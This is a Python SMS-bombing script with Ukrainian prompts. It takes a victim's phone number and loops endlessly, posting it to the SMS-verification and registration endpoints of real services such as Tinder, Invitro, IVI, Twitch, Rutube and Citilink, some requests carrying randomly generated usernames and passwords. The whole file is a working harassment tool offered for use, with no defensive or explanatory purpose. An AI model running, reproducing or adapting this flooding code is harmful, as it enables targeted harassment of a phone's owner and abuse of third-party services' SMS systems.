import requests, random, datetime, sys, time, argparse, os
from colorama import Fore, Back, Style

banner = """
 _____________________________________________________
|                                                     |
| [][][]      [][]     []        [] []   []           |
| []   []    []   []   [][]    [][] []  []     []     |
| []    []  []     []  [] []  [] [] [] []     [] []   |
| []   []   []     []  []  [][]  [] [][]     []   []  |
| [][][]    []     []  []   []   [] [][]    []     [] |
| []   []   []     []  []        [] [] []   [][]|[][] |
| []    []   []   []   []        [] []  []  []     [] | 
| []     []    [][]    []        [] []   [] []     [] |
|_____________________________________________________|
"""

print(banner)
print('Введи номер телефону у форматі:+380XXXXXXXXX')
_phone = input()
_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

iteration = 0
while True:
	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'
	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
		print('[+] Tinder Відправлено!')
	except:
		print('[-] Не Відправлено!')

	try:
		requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
		print('[+] Invitro Відправлено!')
	except:
		print('[-] Не Відправлено!')

	try:
		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
		print('[+] IVI Відправлено!')
	except:
		print('[-] Не Відправлено!')

	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
		print('[+] Tinder Відправлено!')
	except:
		print('[-] Не Відправлено!')

	try:
		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
		print('[+] Twitch Відправлено!')
	except:
		print('[-] Не Відправлено!')
	try:
		requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
		print('[+] Rutube Відправлено!')
	except:
		requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
		print('[+] Citilink Відправлено!')

	
	try:
		iteration += 1
		print(('{} коло пройдено .').format(iteration))
	except:
		break
